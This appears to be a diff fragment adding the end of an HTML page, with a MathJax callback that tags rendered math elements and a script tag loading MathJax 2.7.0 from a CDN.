+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
